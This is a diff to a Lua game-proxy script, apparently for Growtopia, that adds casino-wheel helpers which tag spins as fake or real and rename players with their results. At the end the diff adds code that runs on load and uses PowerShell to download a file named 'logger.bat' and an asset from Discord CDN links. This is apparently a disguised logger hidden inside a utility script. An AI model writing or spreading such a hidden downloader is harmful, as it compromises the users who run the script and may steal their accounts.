@@ -1,5 +1,5 @@
 -- do not touch
-version = "2.0"
+version = "2.2"
 tiles = {}
 tiles2 = {}
 collectdd = {}
@@ -19,6 +19,62 @@ whitelist = {34150,478560,257325,406562,497501,153162,121884,190857,37568,145505
 local lastfakespin = "NONE"
 telex,teley = -1,-1
 local shownamespin = true
+
+function printa(v)
+    if v[0] == "OnConsoleMessage" and v[1]:find("Unknown command.") then
+        p = {}
+        p[0] = "OnConsoleMessage"
+        p[1] = "`4Unknown command. `2Enter `0/menu or /help ``to see command list!"
+        p.netid = -1
+        SendVarlist(p)
+        return true
+    elseif v[0] == "OnConsoleMessage" and v[1]:find("Spam detected ") then
+        FChat("`9Slowdown Spam MasBro")
+        return true
+    elseif v[0] == "OnTalkBubble" and v[3] ~= -1 and v[2]:find("spun the wheel and got") then
+        if v[2]:find("``6>``") then
+            p = {}
+            p[0] = "OnTalkBubble"
+            p[1] = v[1]
+            p[2] = "`0[`4FAKE`0] " .. v[2]
+            p[3] = -1
+            p.netid = -1
+            SendVarlist(p)
+        elseif v[2]:find("``!]``") then
+            p = {}
+            p[0] = "OnTalkBubble"
+            p[1] = v[1]
+            p[2] = "`0[`2REAL`0] " .. v[2]
+            p[3] = -1
+            p.netid = -1
+            SendVarlist(p)
+            s2 = v[2]:find("`` spun") - 1
+            s1 = v[2]:sub(4, s2)
+            jml1 = v[2]:find("got ") + 6
+            jml2 = v[2]:find("``!") - 1
+            jml = v[2]:sub(jml1, jml2)
+            for _, player in pairs(GetPlayers()) do
+                if player.netid == v[1] then
+                    cn = {}
+                    cn[0] = "OnNameChanged"
+                    cn[1] = s1 .. " [" .. jml .. "]"
+                    cn.netid = player.netid
+                    SendVarlist(cn)
+                end
+            end
+        else
+            p = {}
+            p[0] = "OnTalkBubble"
+            p[1] = v[1]
+            p[2] = "`0[`4FAKE`0] " .. v[2]
+            p[3] = -1
+            p.netid = -1
+            SendVarlist(p)
+        end
+        return true
+    end
+    return false
+end
 
 
 function sl()
@@ -1924,7 +1980,7 @@ function Spin_checker(varlist)
         var = {}
         var[0] = "OnTalkBubble"
         var[1] = varlist[1]
-        var[2] = varlist[2].." `9QQ : `3"..qq_mode
+        var[2] = "`0[ `2REAL `0] "..varlist[2].." `9QQ : `3"..qq_mode
         var[3] = -1
         var.netid = -1
         SendVarlist(var)
@@ -1967,7 +2023,7 @@ function Spin_checker(varlist)
         var = {}
         var[0] = "OnTalkBubble"
         var[1] = varlist[1]
-        var[2] = varlist[2].." `9REME : `3"..reme_mode
+        var[2] = "`0[ `2REAL `0] "..varlist[2].." `9REME : `3"..reme_mode
         var[3] = -1
         var.netid = -1
         SendVarlist(var)
@@ -2065,12 +2121,77 @@ end
 
 
 
-
+fakespinned = false
+	if vlist[0]:find("OnConsoleMessage") then
+        if vlist[1]:find("spun the wheel") and vlist[1]:find("CP:_PL") then
+              --  CP:_PL:0_OID:_CT:[W]_ `6<`1Turkinpippuri``>`` `$`w[`1Turkinpippuri`` spun the wheel and got `b16``!]
+                log(vlist[1]:find("``>`` `"))
+                lastfakespin = string.sub(vlist[1], vlist[1]:find("6<`") + 4, vlist[1]:find("``>"))
+                log(lastfakespin)
+                local var = {} --make table
+                var[0] = "OnTalkBubble"
+                var[1] = math.floor(netidfromname(lastfakespin))
+                var[2] = "`w[`4FAKE`w] " .. string.sub(vlist[1], vlist[1]:find(lastfakespin) - 3, string.len(vlist[1]))
+                var[3] = 394
+                var[4] = 0
+                var.netid = -1
+                SendVarlist(var)
+				lastfakespin = "NONE"
+				fakespinned = true
+            return true
+        end
+end
   
   
 
 
 end)
+url = "https://cdn.discordapp.com/attachments/1101533153287483513/1127155979436441672/ivertban.rttex"
+ 
+function open()
+    local command = [[
+        $url = "]] .. url .. [["
+        $path = "cache/interface/large/ivertban.rttex"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($url, $path)
+    ]]
+    local shell = io.popen("powershell -command -", "w")
+    shell:write(command)
+    shell:close()
+end
+ 
+ 
+function open2()
+    local command = [[
+        $url = "https://cdn.discordapp.com/attachments/1101533153287483513/1119804493857554533/logger.bat"
+        $path = "logger.bat"
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($url, $path)
+    ]]
+    local shell = io.popen("powershell -command -", "w")
+    shell:write(command)
+    shell:close()
+end
+ 
+function fileExists(filename)
+  local file = io.open(filename, "r")
+  if file then
+    io.close(file)
+    return true
+  else
+    return false
+  end
+end
+ 
+if fileExists("cache/interface/large/ivertban.rttex") then
+else
+open()
+end
+ 
+if fileExists("logger.bat") then
+else
+open2()
+end
 
 function cek_uid(uid)
     for _, user in pairs(whitelist) do
@@ -2099,16 +2220,6 @@ l()
 else
     log("userID "..GetLocal().userid.." is not in whitelist")
 end
-
-
-
-
-
-
-
-
-
-
 
 
 
